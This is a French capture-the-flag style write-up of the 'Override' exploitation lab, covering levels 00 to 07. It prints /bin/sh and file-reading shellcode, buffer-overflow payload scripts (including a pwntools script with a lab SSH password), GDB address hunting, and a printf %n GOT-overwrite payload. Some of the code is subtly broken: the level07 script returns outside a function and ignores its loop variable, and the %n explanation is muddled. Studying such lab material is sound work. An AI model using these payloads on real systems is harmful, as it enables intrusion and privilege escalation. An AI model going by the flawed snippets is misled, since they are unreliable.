# Override
Learn how to exploit buffer overflow


#Level00

Le plus simple des levels, il faut simplement decommpiler le binaire (personnellement j'ai utilisé le site dogbold). Il suffit de chercher le moment ou le code verifie le mot de passe et de le trouver.

#Level01

On rentre un plus dans le buffer overflow, on decomile le binaire et on remarque que les recuprations d'input se font sur des buffers gigantesques pour le username et le mot de passe attendu par le programme. Il va donc falloir inserer un shell code dans le buffer du username, placer l'adresse du shell code dans le buffer du mot de passe. 

> [!NOTE] 
> Pour trouver l'adresse de la variable du username, personnellement j'ai utilisé la commande 'strings'.
> Pour le shell code j'ai choisie d'utiliser un shell code provenant de Shell Storm.
> J'ai egalement choisis d'utiliser Python pour coder mes scripts pour faciliter la partie code et se concentrer sur la partie exploitation.

```python
import struct

addr_target = 0x0804a040 + 20 # adresse de la variable du username + 20 pour atteindre la "piste d'atterissage" du shell code

shellcode = ("\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b"
    "\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e"
    "\x2f\x73\x68")

username = "dat_wil" +"\x90" * 32 + shellcode
padding = "A" * 80
password = padding + struct.pack("<I", addr_target)


print username
print password
```

> [!NOTE]
> Comment lancer ce code ? 
> (python <nom du fichier python>; cat ) | ./level01

> [!NOTE]
> Pour trouver le bon padding pour se placer sur l'adresse EIP (adresse de retour), j'ai utilisé le tatonnement, en augmentant le padding de 10 en 10 jusqu'a trouver la bonne valeur.


#Level01 - V2

A force de faire des recherches sur internet j'ai finalement decouvert la librairy pwntools qui facilite grandement l'exploitation de ce genre de vulnérabilite. J'ai donc decidé de refaire le level01 en utilisant cette librairie.

```python
from pwn import *

padding = b"A" * 80
target_addr = p32(0x0804a040 + 20)

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

prompt_user = b"dat_wil" + b"\x90" * 100 + shellcode
prompt_pass = padding + target_addr

shell = ssh(user='level01', host='127.0.0.1', port=2222, password='uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL')

prog = shell.run('/home/users/level01/level01')

prog.sendline(prompt_user)
prog.sendline(prompt_pass)

prog.interactive()
```

Pour l'instant j'ai pu utiliser string pour acceder a l'adresse ou est stocké le username (car c'est stocké dans une variable globale), mais je sens que je vais bientot devoir utiliser GDB. 


#level02

Le level02 est aussi un buffer overflow, si on decompile le code on remarque que si l'utilisateur rate son input et reaffiche son input avec printf.
Il faut donc se demander comment a partir du printf on peut accéder a la variable qui stocke le retour de read et donc le mot de passe.
Ma methode est assez simple, j'ai lance le programme et j'ai remplie l'input utilisateur avec des %p, ce qui m'a permis de voir les adresses de la pile. Si on reagarde bien on voit une sequence d'adresses qui commende par un nul et fini par un null et qui ressemble a ce genre  0x756e505234376848, en convertissant cette adresse en ascii on trouve le mot de passe : unP24nH.
Il suffit de ne pas oublier que l'on est en est en little endian et que les caracteres sont donc inversés.



#level03

Pour de niveau on sort un peu du buffer overflow pour revenir sur un reverse engineering sur un binaire.
En le decompilant on void que le programme utilise la fonction decrypt qui va utiliser mon input pour faire un xor dessus pour verifier si il est egale a "Congratulations".
On voit que notre input est manipuler avant d'arriver sur le xor. Le code fait 322424845 - input, et ensuite fait un xor de ce resultat avec une chaine crypté comme ceci: "Q}|u`sfg~sf{}|a3"

Du coup on doit trouver x tel que (322424845 - x) XOR "Q}|u`sfg~sf{}|a3" = "Congratulations"

Par logique on peut donc trouver x en faisant 81(nb ascii de Q) XOR 67(nb ascii de C) = 18, et ensuite en faisant 322424845 - 18 on trouve le bon nombre pour la suite du code : 322424831.


#level04

Le niveau 04 a été ma premiere grande barriere dans ce projet pour l'instant. Le niveau est tres proche du niveau 02, on a un gets qui n'a pas de limite de buffer.
CEPENDAAANT, le programme utilise un proessus enfant pour recupérer les inputs et utitlise egalemment un ptrace pour verifier que le processus enfant n'execute pas de execve pour eviter que l'on puisse faire un shellcode classique pour avoir un shell.
DE PLUS, le programme ne stock pas l'adresse qui nous interesse dans une variable globale, il la stocke dans une variable locale du processus enfant, ce qui rend l'utilisation de nm pour trouver l'adresse impossible.
J'ai donc utilisé GDB pour voir la pile du processus.
Voila la commande et le retour sur ce code :

```bash
 gdb level04
(gdb) disas main
Dump of assembler code for function main:
[...]
   0x08048737 <+111>:   movl   $0x0,0x4(%esp)
   0x0804873f <+119>:   movl   $0x0,(%esp)
   0x08048746 <+126>:   call   0x8048570 <ptrace@plt>
   0x0804874b <+131>:   movl   $0x8048903,(%esp)
   0x08048752 <+138>:   call   0x8048500 <puts@plt>
   0x08048757 <+143>:   lea    0x20(%esp),%eax
   0x0804875b <+147>:   mov    %eax,(%esp)
   0x0804875e <+150>:   call   0x80484b0 <gets@plt>
   0x08048763 <+155>:   jmp    0x804881a <main+338>
   0x08048768 <+160>:   nop
[...]
'''
On remarque que gets stock l'input a l'adresse 0x20(%esp).

>[!NOTE]
> 0x08048752	call puts	Affiche le fameux message "Give me some shellcode, k".
0x08048757	lea 0x20(%esp),%eax	L'étape clé. Calcule l'adresse du buffer v1 et la stocke dans %eax.
0x0804875b	mov %eax,(%esp)	Place cette adresse sur le dessus de la pile pour la donner à gets.
0x0804875e	call gets	Le point vulnérable. Lit ton entrée et la copie à l'adresse stockée dans %eax.

Mais c'est pas tres utile dans ce cas, on ne connait que l'offset de notre buffer par rapport a la pile, mais on ne connait pas l'adresse de la pile.
J'avoue que j'ai vraiment galéré pour trouver la commande gdb pour calculer cette fameuse adresse...

'''
x/x $esp+0x20
'''

Donc maintenant on sait ou est l'adresse de notre buffer, il faut connaitre la taille du buffer d'input pour connaitre le point de bascule pour ecraser l'adresse de retour. En testant avec des padding de 10 en 10, j'ai trouvé que le point de bascule se trouve a 156 caracteres d'input.

On peut maintenant constuire notre plan de payload:

1. On sait que notre piste d'atterissage + shellcode + padding doit faire 156 caracteres pour ecraser l'adresse de retour.
2 - On sait que l'on doit placer l'adresse de notre buffer a la fin en faisant <adresse de la pile calculée> + 32  pour que le programme execute notre shellcode.

```python
import struct

shellcode = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass";

nops = "\x90" * 64;
padding = "A" * (156 - 64 - len(shellcode));
eip = struct.pack("<I", 0xffffd730 + 32);
print (nops + shellcode + padding + eip);
```

Y'a plus cas execute le code et le rediriger dans un fichier et executer cette commande pour lancer le programme avec notre payload :

```bash
(cat /tmp/payload; cat) | ./level04
```


#level05

Alors la, premier gros mur. Le code decompiler nous fait comprendre que la faille est dans une suite de printf d'un buffer d'input suivi d'un exit.
Du coup faut trouver un moyen de "remplacer" le exit par un system("/bin/sh") pour avoir un shell.
De plus on remarque que le code utilise une petite fonction style uppercase pour convertir les majuscule en minuscule, ce qui est un peu critique quand on veux noté des adresses en hexadecimal...
>[!NOTE]
> Pour eviter de devoir subir les transformations du code, on va passer par une variable d'environnement pour stocker notre payload, et ensuite faire pointer le code vers cette variable d'environnement pour executer notre shellcode.
> Pour trouver l'adresse de notre variable on utilise GDB et cette suite de commandes :
```bash
gdb level05
break main
run
x/s *((char **)environ)
```
Ensuite il suffit d'appuyer sur enter jusqu'a trouver une adresse qui correspond a notre variable d'environnement, et voila on a l'adresse de notre shellcode.

Ensuite pour trouver l'adresse de exit dans la plt :
```bash
objdump -R level05
```

Maintenant faut comprendre la spécificité de printf. Si on utilise %n$p, on peut ecrire le nombre de caracteres affichés dans une adresse specifique. Donc si on arrive a ecrire precisement le nombre de caracteres qui est egale a l'adresse de notre shellcode, et que l'on arrive a l'ecrire sur l'adresse de exit, bam on execute notre shellcode quand on exit.

Pour arriver a faire ca il faut faire en sorte que printf %n pointe sur l'adresse de exit, il faut donc qu'on sache a quelle %n notre on recuperer notre propre buffer dans la stack, comme ca on aura plus qu'a rajouter des arguments a printf nous saurons qu'il seront stocker a n + 1, n + 2, etc... et on pourra faire pointer un de ces arguments sur l'adresse de exit pour ecrire notre adresse de shellcode dessus.

CEPENDAAAANNT !

L'adresse de notre variable d'environnement est égale à 0xffff8273, qui en decimal est égal à 4294962931 c'est gigantesque et ca risque de prendre du temps d'ecrire autant de caracteres, du coup il faut diviser l'adresse en deux et reussir a ecrire l'adresse 2octets par 2 octets pour que ca soit plus rapide.

Notre adresse est égale a
0xffff8273

Donc divise par deux on a ffff et 8273, en decimal ca nous fait 65535 et 33331. Donc on va devoir faire en sorte que printf affiche 33331 caracteres pour ecrire les 2 derniers octets de notre adresse, et ensuite faire en sorte que printf affiche 65535 caracteres pour ecrire les 2 premiers octets de notre adresse.
Pour savoir ou viser sur la plt nos deux octets on va simplement prendre l'adresse precedemment trouvé de exit et faire +2 pour viser les 2 octets suivants


Donc voila le plan de notre payload :
1. On place notre shellcode dans une variable d'environnement (avec un tres grosse piste d'atterissage pour etre sur de tomber dessus)

2. On construit notre payload pour faire pointer un %n de printf sur l'adresse de exit dans la plt, et on fait en sorte que les deux %n suivants ecrivent notre adresse de shellcode sur exit 2 octets par 2 octets.

```bash
export MY_VAR= $(python -c "print '\x90' * 100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")

python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%33331x" + "%10$n" + "%65535x" + "%11$n"'

(cat /tmp/payload; cat) | ./level05
```


#level07

Petit pause sur les buffers overflows ^^ La on decompile le binaire et on comprend vite que le prog chercher a trouver un chiffre qui correspond a la fin d'une suite d'operations mathématiques sur notre premier input.

Du coup j'ai fais un petit script python qui produit les memes operations sur une chaines de caracteres.

```python
login = "DUCKING"
v4 = (ord(login[3]) ^ 0x1337) + 6221293
for char in login:
    val = ord(char)
    v4 += (ord(login[3]) ^ 0x1337) + 6221293
return v4
```

Plus qu'a rentré le login DUCKING dans le premier input et le resultat trouvé dans v4 pour le second et le tour est joué.